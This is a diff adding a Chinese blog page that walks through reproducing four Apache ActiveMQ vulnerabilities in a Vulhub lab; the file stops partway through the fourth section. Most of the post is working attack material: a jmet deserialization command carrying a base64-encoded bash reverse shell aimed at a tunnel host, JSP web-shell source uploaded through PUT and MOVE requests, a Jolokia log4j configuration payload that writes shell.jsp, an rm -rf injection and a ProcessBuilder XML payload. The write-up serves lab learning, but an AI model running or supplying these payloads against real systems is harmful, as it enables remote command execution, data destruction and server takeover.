@@ -1,0 +1,778 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="G00d">
+
+
+    <meta name="subtitle" content="没有人会一直一帆风顺，失败和挫折才是人生常态">
+
+
+
+    <meta name="keywords" content="G00dddd">
+
+
+<title>Vulhub-Vulhub-1Apache_ActiveMQ | G00d`s Blog</title>
+
+
+
+    <link rel="icon" href="../favicon.ico">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="../css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="../js/script.js"></script>
+    
+    <script src="../js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+    <script>
+        // this function is used to check current theme before page loaded.
+        (() => {
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
+            const isDark = currentTheme === 'dark';
+            const pagebody = document.getElementsByTagName('body')[0]
+            if (isDark) {
+                pagebody.classList.add('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
+            } else {
+                pagebody.classList.remove('dark-theme');
+                // mobile
+                document.getElementById("mobile-toggle-theme").innerText = "· Light"
+            }
+        })();
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //创建雪花元素
+    function snow() {
+      //获取视窗的宽高
+      var width = window.innerWidth;
+      var height = window.innerHeight;
+  
+      var snow = document.createElement("div");             //创建元素
+  
+      //初始化雪花样式
+      size = Math.random() * 15 + 10;                          //随机生成雪花大小
+      snow.style.width = size + "px";
+      snow.style.height = size + "px";
+      snow.style.background = "url(img/雪花" + Math.floor((Math.random()*6)+1) + ".png) no-repeat";   //1-6随机选择雪花的图片
+      // snow.style.background = "url(./雪花.png) no-repeat";
+      snow.style.backgroundSize = '100% 100%';
+      snow.style.position = "fixed";                        //元素的位置相对于浏览器窗口是固定位置，即使窗口是滚动的它也不会移动
+      snow.style.filter = "blur(1px)";                      //给图片设置高斯模糊
+      snow.style.left = Math.random() * width + 'px';         //随机生成雪花的初始位置
+      snow.style.top = "10px";
+      snow.style.opacity = parseInt(Math.random()*10)/2;   //随机生成雪花的透明度
+  
+      //向body添加元素
+      document.body.appendChild(snow);
+  
+      //创建定时器，每30ms雪花下落一次
+      var timer = setInterval(function () {
+        snow.style.top = parseInt(snow.style.top) + 3 + 'px';     //每次下落3px
+  
+        //当雪花到达底部后清除元素
+        if (parseInt(snow.style.top) >= height) {
+          clearInterval(timer);
+          snow.parentNode.removeChild(snow)
+        }
+      }, 30)
+    }
+  
+    //页面加载完成执行函数
+    window.onload = function play() {
+      //创建定时器，每300ms生成一朵雪花
+      setInterval(function () {
+        snow()
+      }, 300)
+    }
+  </script>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script>
+    //蜘蛛网特效
+    !
+    function() {
+        function n(n, e, t) {
+            return n.getAttribute(e) || t
+        }
+        function e(n) {
+            return document.getElementsByTagName(n)
+        }
+        function t() {
+            var t = e("script"),
+            o = t.length,
+            i = t[o - 1];
+            return {
+                l: o,
+                z: n(i, "zIndex", -1),
+                o: n(i, "opacity", .9),   //透明度
+                c: n(i, "color", "255, 102, 153"),   //颜色
+                n: n(i, "count", 99)
+            }
+        }
+        function o() {
+            a = m.width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth,
+            c = m.height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight
+        }
+        function i() {
+            r.clearRect(0, 0, a, c);
+            var n, e, t, o, m, l;
+            s.forEach(function(i, x) {
+                for (i.x += i.xa, i.y += i.ya, i.xa *= i.x > a || i.x < 0 ? -1 : 1, i.ya *= i.y > c || i.y < 0 ? -1 : 1, r.fillRect(i.x - .5, i.y - .5, 1, 1), e = x + 1; e < u.length; e++) n = u[e],
+                null !== n.x && null !== n.y && (o = i.x - n.x, m = i.y - n.y, l = o * o + m * m, l < n.max && (n === y && l >= n.max / 2 && (i.x -= .03 * o, i.y -= .03 * m), t = (n.max - l) / n.max, r.beginPath(), r.lineWidth = t / 2, r.strokeStyle = "rgba(" + d.c + "," + (t + .2) + ")", r.moveTo(i.x, i.y), r.lineTo(n.x, n.y), r.stroke()))
+            }),
+            x(i)
+        }
+        var a, c, u, m = document.createElement("canvas"),
+        d = t(),
+        l = "c_n" + d.l,
+        r = m.getContext("2d"),
+        x = window.requestAnimationFrame || window.webkitRequestAnimationFrame || window.mozRequestAnimationFrame || window.oRequestAnimationFrame || window.msRequestAnimationFrame ||
+        function(n) {
+            window.setTimeout(n, 1e3 / 45)
+        },
+        w = Math.random,
+        y = {
+            x: null,
+            y: null,
+            max: 2e4
+        };
+        m.id = l,
+        m.style.cssText = "position:fixed;top:0;left:0;z-index:" + d.z + ";opacity:" + d.o,
+        e("body")[0].appendChild(m),
+        o(),
+        window.onresize = o,
+        window.onmousemove = function(n) {
+            n = n || window.event,
+            y.x = n.clientX,
+            y.y = n.clientY
+        },
+        window.onmouseout = function() {
+            y.x = null,
+            y.y = null
+        };
+        for (var s = [], f = 0; d.n > f; f++) {
+            var h = w() * a,
+            g = w() * c,
+            v = 2 * w() - 1,
+            p = 2 * w() - 1;
+            s.push({
+                x: h,
+                y: g,
+                xa: v,
+                ya: p,
+                max: 6e3
+            })
+        }
+        u = s.concat([y]),
+        setTimeout(function() {
+            i()
+        },
+        100)
+    } ();
+
+    //蜘蛛网特效
+    </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">G00d&#39;s Blog</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">G00d&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="../archives">Posts</a>
+                
+                    <a class="menu-item" href="../category">Categories</a>
+                
+                    <a class="menu-item" href="../tag">Tags</a>
+                
+                    <a class="menu-item" href="../about">About</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+            <div class="main">
+                <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    var tocbot_timer;
+    var DEPTH_MAX = 6; // 为 6 时展开所有
+    var tocbot_default_config = {
+        tocSelector: '.tocbot-list',
+        contentSelector: '.post-content',
+        headingSelector: 'h1, h2, h3, h4, h5',
+        orderedList: false,
+        scrollSmooth: true,
+        onClick: extend_click,
+    };
+
+    function extend_click() {
+        clearTimeout(tocbot_timer);
+        tocbot_timer = setTimeout(function() {
+            tocbot.refresh(obj_merge(tocbot_default_config, {
+                hasInnerContainers: true
+            }));
+        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
+    }
+
+    document.ready(function() {
+        tocbot.init(obj_merge(tocbot_default_config, {
+            collapseDepth: 1
+        }));
+    });
+
+    function expand_toc() {
+        var b = document.querySelector('.tocbot-toc-expand');
+        var expanded = b.getAttribute('data-expanded');
+        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
+        tocbot.refresh(obj_merge(tocbot_default_config, {
+            collapseDepth: expanded ? 1 : DEPTH_MAX
+        }));
+        b.innerText = expanded ? 'Expand all' : 'Collapse all';
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+    function obj_merge(target, source) {
+        for (var item in source) {
+            if (source.hasOwnProperty(item)) {
+                target[item] = source[item];
+            }
+        }
+        return target;
+    }
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">Vulhub-Vulhub-1Apache_ActiveMQ</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">G00d</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 22, 2024&nbsp;&nbsp;17:20:46</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="../categories/Vulhub/">Vulhub</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h1 id="Apache-ActiveMQ-是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring-Framework等。"><a href="#Apache-ActiveMQ-是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring-Framework等。" class="headerlink" title="Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。"></a>Apache ActiveMQ 是美国阿帕奇（Apache）软件基金会所研发的一套开源的消息中间件，它支持Java消息服务、集群、Spring Framework等。</h1><h3 id="1-ActiveMQ反序列化（CVE-2015-5254）"><a href="#1-ActiveMQ反序列化（CVE-2015-5254）" class="headerlink" title="1.ActiveMQ反序列化（CVE-2015-5254）"></a><strong>1.ActiveMQ反序列化（CVE-2015-5254）</strong></h3><p>前面漏洞原理我就不累赘了，直接看vulhub里面的附件吧，开始复现</p>
+<p>在这里要安装工具</p>
+<p>使用jmet进行漏洞利用:</p>
+<p>首先下载jmet的jar文件，并在同目录下创建一个external文件夹（否则可能会爆文件夹不存在的错误）。jmet原理是使用ysoserial生成Payload并发送（其jar内自带ysoserial，无需再自己下载），所以我们需要在ysoserial是gadget中选择一个可以使用的，比如ROME。</p>
+<p>cd &#x2F;opt</p>
+<p>wget <a target="_blank" rel="noopener" href="https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar">https://github.com/matthiaskaiser/jmet/releases/download/0.1.0/jmet-0.1.0-all.jar</a></p>
+<p>然后直接在当前文件夹打开命令行就可以了，输入这个命令</p>
+<p>java -jar jmet-0.1.0-all.jar -Q myevent -I ActiveMQ -s -Y “touch &#x2F;tmp&#x2F;success” -Yp ROME 8.130.129.187 61616</p>
+<p>Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings&#x3D;on -Dswing.aatext&#x3D;true</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//1.jpg" alt="1"></p>
+<p>如果出现这种情况，就是jdk版本太高了，安装一个jdk8</p>
+<p>jdk8： wget <a target="_blank" rel="noopener" href="https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz">https://repo.huaweicloud.com/java/jdk/8u202-b08/jdk-8u202-linux-x64.tar.gz</a></p>
+<p>继续往下做</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//2.jpg" alt="2"></p>
+<p>这个是正常返回</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//3.webp" alt="3"></p>
+<p>现在admin不知情点击这个</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//4.webp" alt="4"></p>
+<p>点击这个查看消息，就能触发我们上传的代码，来一记删库</p>
+<p>当然我们的目的是要拿到权限哈，既然判断了能够利用jmet，那么想办法反弹shell</p>
+<p>还得做个穿透 ，当然如果你的靶机部署在内网里，忽略这些，我的意思是你的靶机和你的操作机（kali）能相互ping通</p>
+<p>secure introspectable tunnels to localhost​</p>
+<p>dashboard.cpolar.com&#x2F;login</p>
+<p>cpolar挺好用的，具体设置结合这篇文章吧</p>
+<p>Kali Linux结合cpolar内网穿透实现公网环境SSH远程访问​</p>
+<p>blog.csdn.net&#x2F;ljq_up&#x2F;article&#x2F;details&#x2F;136839887</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//5.png" alt="5"></p>
+<p>ok，那我这里就默认你们会了</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//6.webp" alt="6"></p>
+<p>这是我的出网ip和端口</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//7.webp" alt="7"></p>
+<p>反弹shell命令我用base64加密了</p>
+<p>*[~]#棱角 ::Edge.Forum**这里推荐一个反弹shell命令生成器</p>
+<p>‘&#x2F;root&#x2F;java8&#x2F;jdk1.8.0_202&#x2F;bin&#x2F;java’ -jar ‘&#x2F;root&#x2F;jmet&#x2F;jmet-0.1.0-all.jar’</p>
+<p>-Q myevent -I ActiveMQ -s -Y</p>
+<p>“bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC82LnRjcC52aXAuY3BvbGFyLmNuLzExNjQ1IDA+JjE&#x3D;}|{base64,-d}|{bash,-i}”</p>
+<p>-Yp ROME 8.130.129.187 61616</p>
+<p>上面就是payload，把echo后面的base64换成你们的就行了</p>
+<p>同时要监听端口 nc -lvvp 22 我这里用的本地22号端口和cpolar绑定的</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//8.webp" alt="8"></p>
+<p>一旦admin点开那条消息，我们就有流量了</p>
+<h2 id="2-ActiveMQ任意文件写入漏洞（CVE-2016-3088）"><a href="#2-ActiveMQ任意文件写入漏洞（CVE-2016-3088）" class="headerlink" title="2.ActiveMQ任意文件写入漏洞（CVE-2016-3088）"></a>2.ActiveMQ任意文件写入漏洞（CVE-2016-3088）</h2><p>前面漏洞原理我就不累赘了，直接看vulhub里面的附件吧，开始复现</p>
+<p>url&#x2F;fileserver 这个是web的文件服务器，</p>
+<p>url&#x2F;api 这个可以查看上传的所有文件</p>
+<p>抓包上传jsp马</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//9.webp" alt="9"></p>
+<p>这是刚抓的包</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//10.webp" alt="10"></p>
+<p>这个是改提交方式为PUT，并且提交马,回显204，上传成功，现在去看一下fileserver&#x2F;1.txt是会有东西的</p>
+<p>PUT &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</p>
+<p>Host: 8.130.129.187:8161</p>
+<p>Cache-Control: max-age&#x3D;0</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;115.0.5790.171 Safari&#x2F;537.36</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Cookie: td_cookie&#x3D;3860191058</p>
+<p>If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</p>
+<p>Connection: close</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>Content-Length: 329</p>
+<p>&lt;%@ page import&#x3D;”java.io.*“%&gt;</p>
+<p>&lt;%</p>
+<p>out.print(“Hello&lt;&#x2F;br&gt;“);</p>
+<p>String strcmd&#x3D;request.getParameter(“cmd”);</p>
+<p>String line&#x3D;null;</p>
+<p>Process p&#x3D;Runtime.getRuntime().exec(strcmd);</p>
+<p>BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</p>
+<p>while((line&#x3D;br.readLine())!&#x3D;null){</p>
+<p>out.print(line+”&lt;&#x2F;br&gt;“);</p>
+<p>}</p>
+<p>%&gt; &#x2F;&#x2F;这个就是一句话马，其中PUT头那一行，必须是.txt 不然上传失败</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//11.webp" alt="11"></p>
+<p>这里用MOVE，把1.txt移动到admin的1.jsp目录，返回值204</p>
+<p>这里有个漏洞，名字我忘记了，反正知道有个漏洞就行了， 能够把1.txt文件当成1.jsp运行，</p>
+<p>我记得是Java的中间件漏洞，</p>
+<p>MOVE &#x2F;fileserver&#x2F;1.txt HTTP&#x2F;1.1</p>
+<p>Destination: file:&#x2F;&#x2F;&#x2F;opt&#x2F;activemq&#x2F;webapps&#x2F;admin&#x2F;1.jsp</p>
+<p>Host: 8.130.129.187:8161</p>
+<p>Cache-Control: max-age&#x3D;0</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;115.0.5790.171 Safari&#x2F;537.36</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Cookie: td_cookie&#x3D;3860191058</p>
+<p>If-Modified-Since: Fri, 13 Feb 2015 17:54:40 GMT</p>
+<p>Connection: close</p>
+<p>Content-Type: application&#x2F;x-www-form-urlencoded</p>
+<p>Content-Length: 329</p>
+<p>&lt;%@ page import&#x3D;”java.io.*“%&gt;</p>
+<p>&lt;%</p>
+<p>out.print(“Hello&lt;&#x2F;br&gt;“);</p>
+<p>String strcmd&#x3D;request.getParameter(“cmd”);</p>
+<p>String line&#x3D;null;</p>
+<p>Process p&#x3D;Runtime.getRuntime().exec(strcmd);</p>
+<p>BufferedReader br&#x3D;new BufferedReader(new InputStreamReader(p.getInputStream()));</p>
+<p>while((line&#x3D;br.readLine())!&#x3D;null){</p>
+<p>out.print(line+”&lt;&#x2F;br&gt;“);</p>
+<p>}</p>
+<p>%&gt;</p>
+<p>ok，这样jsp马上传成功，并且在admin目录下</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//12.webp" alt="12"></p>
+<p>我尝试了一下，把一句话放到api也可以，当然也可以直接蚁剑连</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//13.webp" alt="13"></p>
+<h2 id="3-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）"><a href="#3-ActiveMQ-Jolokia-后台远程代码执行漏洞（CVE-2022-41678）" class="headerlink" title="3.ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）"></a>3.ActiveMQ Jolokia 后台远程代码执行漏洞（CVE-2022-41678）</h2><p>ActiveMQ中，经过身份验证的用户默认情况下可以通过&#x2F;api&#x2F;jolokia&#x2F;接口操作MBean，其中FlightRecorder可以被用于写Jsp WebShell，从而造成远程代码执行漏洞</p>
+<p><strong>FlightRecorder存在于Jdk 11+，具体类名：jdk.management.jfr.FlightRecorderMXBeanImpl</strong></p>
+<p>使用org.apache.logging.log4j.core.jmx.LoggerContextAdminMBean，这是由Log4j2提供的一个MBean。</p>
+<p>攻击者使用这个MBean中的setConfigText操作可以更改Log4j的配置，进而将日志文件写入任意目录中。</p>
+<p><strong>第一步访问，获取到MBean值，抓包url&#x2F;api&#x2F;jolokia&#x2F;list 但是要加Origin:url:port</strong></p>
+<p><img src="/vulhub-vulhub-1apache-activemq//14.webp" alt="14"></p>
+<p>直接搜索org.apache.logging.log4j</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//15.webp" alt="15"></p>
+<p>第二步再次访问，此处的mbean（type&#x3D;6dd）在上面获取到</p>
+<p>{</p>
+<p>“type”: “exec”,</p>
+<p>“mbean”: “org.apache.logging.log4j2:type&#x3D;6ddf90b0”,</p>
+<p>“operation”: “setConfigText”,</p>
+<p>“arguments”: [</p>
+<p>“xml”,</p>
+<p>“utf-8”]</p>
+<p>}</p>
+<p>拿过来以POST提交</p>
+<p>POST &#x2F;api&#x2F;jolokia HTTP&#x2F;1.1</p>
+<p>Host: 8.130.129.187:8161</p>
+<p>Origin:8.130.129.187:8161</p>
+<p>Authorization: Basic YWRtaW46YWRtaW4&#x3D;</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;115.0.5790.171 Safari&#x2F;537.36</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Cookie: td_cookie&#x3D;3860191058</p>
+<p>Connection: close</p>
+<p>Content-Length: 137</p>
+<p>{“type”: “exec”, “mbean”: “org.apache.logging.log4j2:type&#x3D;6ddf90b0”, “operation”: “setConfigText”, “arguments”: [“xml”, “utf-8”]}</p>
+<p>xml为POC中的evil_template内容在这里我直接用的xml，也可以在用poc.py的内容替换一下，此处出现”status”:200，就可以证明漏洞存在</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//16.webp" alt="16"></p>
+<p>第三步传马</p>
+<p>现在传一句话User-Agent: Mozilla ||| &lt;% Process p &#x3D; Runtime.getRuntime().exec(request.getParameter(“cmd”)); out.println(org.apache.commons.io.IOUtils.toString(p.getInputStream(), “utf-8”)); %&gt; |||</p>
+<p>当然也可以来一记rm -rf 返回是200就对了，我给自己来了一记，然后容器进不去了，最后重启了一次docker</p>
+<p>消息头：</p>
+<p>GET &#x2F;api&#x2F;jolokia&#x2F;version HTTP&#x2F;1.1</p>
+<p>Host: 8.130.129.187:8161</p>
+<p>Origin:8.130.129.187:8161</p>
+<p>Authorization: Basic YWRtaW46YWRtaW4&#x3D;</p>
+<p>Upgrade-Insecure-Requests: 1</p>
+<p>User-Agent:zilla ||| &lt;% Process p &#x3D;rm -rf %&gt; |||</p>
+<p>Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.7</p>
+<p>Accept-Encoding: gzip, deflate</p>
+<p>Accept-Language: zh-CN,zh;q&#x3D;0.9</p>
+<p>Cookie: td_cookie&#x3D;3860191058</p>
+<p>Connection: close</p>
+<p>Content-Length: 137</p>
+<p>{“type”: “exec”, “mbean”: “org.apache.logging.log4j2:type&#x3D;6ddf90b0”, “operation”: “setConfigText”, “arguments”: [“xml”, “utf-8”]}</p>
+<p>xml文件是evil_template，但是需要采用\ 和\n进行转义，这是我已经转义过的</p>
+<p>&lt;?xml version&#x3D;\1.0\ encoding&#x3D;\UTF-8\?&gt;</p>
+<p>&lt;Configuration&gt;\n</p>
+<p>&lt;Appenders&gt;\n</p>
+<p>&lt;Console name&#x3D;\Console\ target&#x3D;\SYSTEM_OUT\&gt;\n</p>
+<p>&lt;PatternLayout pattern&#x3D;\%5p | %m%n\&#x2F;&gt;\n</p>
+<p>&lt;&#x2F;Console&gt;\n</p>
+<p>&lt;RollingRandomAccessFile name&#x3D;\RollingFile\ fileName&#x3D;\${sys:activemq.data}&#x2F;..&#x2F;webapps&#x2F;admin&#x2F;shell.jsp\ \n</p>
+<p>filePattern&#x3D;\${sys:activemq.data}&#x2F;..&#x2F;webapps&#x2F;admin&#x2F;shell.jsp.%i\&gt;\n</p>
+<p>&lt;PatternLayout pattern&#x3D;\%d | %-5p | %m | %c | %t%n%throwable{full}\&#x2F;&gt;\n</p>
+<p>&lt;Policies&gt;\n</p>
+<p>&lt;SizeBasedTriggeringPolicy size&#x3D;\1MB\&#x2F;&gt;\n</p>
+<p>&lt;&#x2F;Policies&gt;\n</p>
+<p>&lt;&#x2F;RollingRandomAccessFile&gt;\n</p>
+<p>&lt;RollingRandomAccessFile name&#x3D;\AuditLog\ fileName&#x3D;\${sys:activemq.data}&#x2F;audit.log\ filePattern&#x3D;\${sys:activemq.data}&#x2F;audit.log.%i\&gt;\n</p>
+<p>&lt;PatternLayout pattern&#x3D;\%-5p | %m | %t%n\&#x2F;&gt;\n</p>
+<p>&lt;Policies&gt;\n</p>
+<p>&lt;SizeBasedTriggeringPolicy size&#x3D;\1MB\&#x2F;&gt;\n</p>
+<p>&lt;&#x2F;Policies&gt;\n</p>
+<p>&lt;&#x2F;RollingRandomAccessFile&gt;\n</p>
+<p>&lt;&#x2F;Appenders&gt;\n</p>
+<p>&lt;Loggers&gt;\n</p>
+<p>&lt;Root level&#x3D;\INFO\&gt;\n</p>
+<p>&lt;AppenderRef ref&#x3D;\Console\&#x2F;&gt;\n</p>
+<p>&lt;AppenderRef ref&#x3D;\RollingFile\&#x2F;&gt;\n</p>
+<p>&lt;&#x2F;Root&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.apache.activemq.spring\ level&#x3D;\WARN\&#x2F;&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.apache.activemq.web.handler\ level&#x3D;\WARN\&#x2F;&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.springframework\ level&#x3D;\WARN\&#x2F;&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.apache.xbean\ level&#x3D;\WARN\&#x2F;&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.eclipse.jetty\ level&#x3D;\DEBUG\&#x2F;&gt;\n</p>
+<p>&lt;Logger name&#x3D;\org.apache.activemq.audit\ level&#x3D;\INFO\ additivity&#x3D;\false\&gt;\n</p>
+<p>&lt;AppenderRef ref&#x3D;\AuditLog\&#x2F;&gt;\n</p>
+<p>&lt;&#x2F;Logger&gt;\n</p>
+<p>&lt;!– Uncomment and modify as needed for ActiveMQ logger\n</p>
+<p>&lt;Logger name&#x3D;\org.apache.activemq\ level&#x3D;\DEBUG\&#x2F;&gt;\n</p>
+<p>–&gt;\n</p>
+<p>&lt;&#x2F;Loggers&gt;\n</p>
+<p>&lt;&#x2F;Configuration&gt;\n</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//17.webp" alt="17"></p>
+<p>post提交</p>
+<p><img src="/vulhub-vulhub-1apache-activemq//18.webp" alt="18"></p>
+<p>成功</p>
+<p>访问&#x2F;admin&#x2F;shell.jsp?cmd&#x3D;ls 可以看到命令成功执行</p>
+<h2 id="4-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）"><a href="#4-ActiveMQ-OpenWire-协议反序列化命令执行漏洞（CVE-2023-46604）" class="headerlink" title="4.ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）"></a>4.ActiveMQ OpenWire 协议反序列化命令执行漏洞（CVE-2023-46604）</h2><p>OpenWire协议在ActiveMQ中被用于多语言客户端与服务端通信。在Apache ActiveMQ 5.18.2版本及以前，OpenWire协议通信过程中存在一处反序列化漏洞，该漏洞可以允许具有网络访问权限的远程攻击者通过操作 OpenWire 协议中的序列化类类型，导致代理的类路径上的任何类实例化，从而执行任意命令。</p>
+<p>修改xml（下面是代码，命名为poc.xml）为反弹shell命令</p>
+<p>&lt;?xml version&#x3D;”1.0” encoding&#x3D;”UTF-8” ?&gt;</p>
+<p>&lt;beans xmlns&#x3D;”<a target="_blank" rel="noopener" href="http://www.springframework.org/schema/beans">http://www.springframework.org/schema/beans</a>“</p>
+<p>xmlns:xsi&#x3D;”<a target="_blank" rel="noopener" href="http://www.w3.org/2001/XMLSchema-instance">http://www.w3.org/2001/XMLSchema-instance</a>“</p>
+<p>xsi:schemaLocation&#x3D;”<a target="_blank" rel="noopener" href="http://www.springframework.org/schema/beans">http://www.springframework.org/schema/beans</a></p>
+<p><a target="_blank" rel="noopener" href="http://www.springframework.org/schema/beans/spring-beans.xsd%22/%3E">http://www.springframework.org/schema/beans/spring-beans.xsd&quot;\&gt;</a></p>
+<p>&lt;bean id&#x3D;”pb” class&#x3D;”java.lang.ProcessBuilder” init-method&#x3D;”start”&gt;</p>
+<p>&lt;constructor-arg&gt;</p>
+<p>&lt;list&gt;</p>
+<p>&lt;value&gt;touch&lt;&#x2F;value&gt;</p>
